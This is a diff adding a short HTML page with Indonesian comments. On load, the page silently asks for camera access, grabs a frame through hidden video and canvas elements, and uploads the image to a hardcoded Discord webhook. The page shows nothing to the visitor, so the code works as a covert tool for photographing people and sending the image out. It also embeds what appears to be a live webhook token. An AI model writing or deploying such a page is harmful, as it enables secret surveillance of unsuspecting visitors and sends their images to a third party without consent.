@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Auto Kamera Kirim ke Discord</title>
+</head>
+<body>
+  <video id="video" autoplay playsinline muted width="320" height="240" style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <script>
+    async function startCameraAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          // Tunggu 1 detik supaya kamera sempat aktif
+          setTimeout(() => {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+              const webhookURL = "https://discord.com/api/webhooks/1362791961437933739/XtSJE6yIX3oZIzgA9whNdLddUCSAxkj9VFgfjWfjVjopdKkTcQxp0HlybawvzIA1TaWl"; // ganti dengan milikmu
+              const formData = new FormData();
+              formData.append("file", blob, "cuplikan.png");
+
+              fetch(webhookURL, {
+                method: "POST",
+                body: formData
+              }).then(response => {
+                console.log(response.ok ? "Terkirim" : "Gagal mengirim");
+              });
+            }, 'image/png');
+          }, 1000);
+        };
+      } catch (err) {
+        console.error("Gagal akses kamera:", err);
+      }
+    }
+
+    window.onload = startCameraAndSend;
+  </script>
+</body>
+</html>
